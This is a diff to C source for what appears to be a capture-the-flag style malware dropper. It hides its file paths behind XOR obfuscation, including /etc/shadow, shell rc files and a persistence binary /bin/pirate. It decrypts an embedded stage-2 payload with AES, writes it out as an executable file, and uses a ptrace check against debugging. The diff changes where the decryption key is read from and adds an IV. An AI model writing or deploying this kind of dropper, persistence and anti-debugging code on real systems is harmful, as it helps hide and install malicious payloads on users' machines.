@@ -27,7 +27,7 @@ extern const int _binary_stage2_size;
 //#define SELF_XOR "/proc/self/exe"
 //#define BASHRC_XOR "%s/.bashrc"
 //#define ZSHRC_XOR "%s/.zshrc"
-//#define SHADOW_XOR "/etc/shadow"
+//#define SHADOW_XOR "/usr/lib/os-release"
 //#define PERSISTENCE_XOR "/bin/pirate"
 // END_SOURCE_STRINGS
 
@@ -71,30 +71,28 @@ int round_up(int toRound, int multiple) {
  */
 void decrypt_stage2(char * write_destination) {
     char write_dest[256] = {0};
+    uint8_t iv[] = "whatisthiscapt??";
+    struct AES_ctx context;
     strncpy(write_dest, write_destination, (sizeof write_dest) - 1);
 
-    // Get the decryption key, which is readf 
+    // Get the decryption key, which is read from a file on disk 
     char * shadow_file = dexor(SHADOW_XOR);
-    // Read the first 16 characters from /etc/shadow
     int fd = open(shadow_file, O_RDONLY);
-    const uint8_t key[16];
-    int read_in  = read(fd, &key, AES_KEYLEN);
+    uint8_t key[16];
+    int read_in  = read(fd, key, AES_KEYLEN);
     close(fd);
 
     if (read_in == AES_KEYLEN) {
     
-        // Copy the decrypted payload
-        struct AES_ctx context;
-        AES_init_ctx(&context, key);
-
         // Allocate buffer for Stage2 Malloc
 	int malloc_size = round_up(&_binary_stage2_size, AES_KEYLEN);
         uint8_t * dec_buf = (uint8_t *) malloc(malloc_size);
 	memcpy(dec_buf, &_binary_stage2_start, malloc_size);
 
 	if (dec_buf != NULL) {
-            // Decrypt the buffer
-	    AES_CBC_decrypt_buffer(&context, dec_buf, malloc_size);
+            // Decrypt the buffer 
+            AES_init_ctx_iv(&context, key, iv);
+            AES_CBC_decrypt_buffer(&context, dec_buf, malloc_size);
 
             // Open file for writing 
             int persistence_file = open(write_dest, O_CREAT | O_WRONLY , 0755); 
@@ -107,7 +105,6 @@ void decrypt_stage2(char * write_destination) {
             } 
             free(dec_buf);
 	}
-
     } 
 }
 
@@ -205,7 +202,6 @@ void print_meme() {
 	close(curr_file);
     }
     return;
-    // Chmod the executable so that we can execute it
     failure:
        close(curr_file);
        if (dest_file >= 0) {
@@ -240,7 +236,7 @@ int main() {
     // Debug prevention. Really we are preventing an easy strace :)
     if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
         printf(dexor(CAPN_XOR));
-	exit(0);
+        exit(0);
     } else {
         ptrace(PTRACE_DETACH, 0, 1, 0);
     }
